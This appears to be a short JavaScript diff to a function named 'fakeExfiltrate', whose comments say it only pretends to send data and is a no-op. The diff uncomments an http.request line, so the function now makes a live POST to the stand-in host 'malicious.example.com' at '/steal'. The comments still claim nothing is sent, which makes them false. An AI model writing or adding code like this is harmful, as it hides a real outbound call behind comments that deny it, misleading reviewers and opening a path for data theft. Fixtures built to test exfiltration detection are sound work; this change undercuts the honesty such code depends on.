@@ -15,7 +15,7 @@ const suspiciousData = {
 // Pretend to send data to a remote server (but does not actually send anything)
 function fakeExfiltrate(data) {
   // Looks like exfiltration, but is a no-op
-  // http.request({ hostname: 'malicious.example.com', path: '/steal', method: 'POST' }, () => {});
+  http.request({ hostname: 'malicious.example.com', path: '/steal', method: 'POST' }, () => {});
   return 'Pretending to exfiltrate: ' + JSON.stringify(data);
 }
 
